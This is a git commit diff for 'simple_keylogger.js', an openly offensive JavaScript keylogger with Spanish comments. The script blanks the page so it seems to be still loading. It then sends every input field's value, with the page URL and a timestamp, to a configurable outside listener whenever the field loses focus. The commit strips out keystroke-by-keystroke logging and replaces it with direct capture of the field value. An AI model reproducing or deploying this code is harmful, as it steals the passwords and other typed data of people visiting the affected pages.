ab23ed53e96486af64ed2ef9867c3f75586292dc
CTPache <33907485+CTPache@users.noreply.github.com>
2024-03-22 17:44:05 +0100

    Update simple_keylogger.js

--- simple_keylogger.js
+++ simple_keylogger.js
@@ -1,13 +1,5 @@
 //Esto lo dejo así para cambiarlo por consola
 var https_listener_for_logging = 'https://listener.changeme'
-//String que representa el texto a capturar
-var log = ''
-//Representación del cursor
-cursor = 0
-//Teclas que, si se capturan, se van a ignorar
-var ignoredKeys = ['Shift', 'CapsLock', 'Tab', 'Control', 'Alt']
-//Flag de depuracion
-debug = false
 document.addEventListener('DOMContentLoaded', function () {
     // Borramos el contenido para que parezca que sigue cargando
     document.body.innerHTML = '';
@@ -29,69 +21,9 @@ document.addEventListener('DOMContentLoaded', function () {
             inputs.forEach(i => {
                 i.addEventListener("blur", (event) => {
                     fetch(https_listener_for_logging, {
-                        method: "POST", body: JSON.stringify({ "log": log, 'url' : newUrl, 'id': event.currentTarget.getAttribute("id"), "timestamp": Date.now() }),
+                        method: "POST", body: JSON.stringify({ "log": i.value, 'url' : newUrl, 'id': event.currentTarget.getAttribute("id"), "timestamp": Date.now() }),
                     })
-                    log = ''
-                    cursor = 0
                 })
-                i.addEventListener("focus", (event) => {
-                    log = i.value
-                    setTimeout(function(){ i.selectionStart = i.selectionEnd = log.length; }, 0);
-                    cursor = log.length
-                })
-            }
-            );
-
-            window.addEventListener("keydown", function (e) {
-                switch (e.key){
-                    case 'Backspace':
-                        if (e.ctrlKey)
-                        {
-                            log = log.slice(cursor)
-                            cursor = 0
-                        }
-                        else
-                        {
-                            if (cursor > 0)
-                            {
-                                log = log.slice(0, cursor - 1) + log.slice(cursor)
-                                cursor--
-                            }
-                        }
-                        break
-                    case 'Delete':
-                        if (e.ctrlKey)
-                            log = log.slice(cursor, log.length)
-                        else
-                            log = log.slice(0, cursor) + log.slice(cursor + 1)
-                        break
-                    case 'ArrowLeft':
-                        if (e.ctrlKey)
-                            cursor = 0;
-                        else if (cursor > 0)
-                            cursor--
-                        break
-                    case 'ArrowRight':
-                         if (e.ctrlKey)
-                            cursor = log.length - 1
-                        else if (cursor < log.length - 1)
-                            cursor++
-                        break
-                    case 'ArrowUp':
-                        cursor = 0
-                        break
-                    case 'ArrowDown':
-                        cursor = log.length - 1
-                        break
-                    default:
-                        if (!ignoredKeys.includes(e.key))
-                        {
-                            log = log.substring(0, cursor) + e.key + log.substring(cursor)
-                            cursor++
-                        }
-                }
-                if (debug)
-                    console.log('log: '+ log + '\ncursor: ' + cursor)
             });
             console.clear();
         })
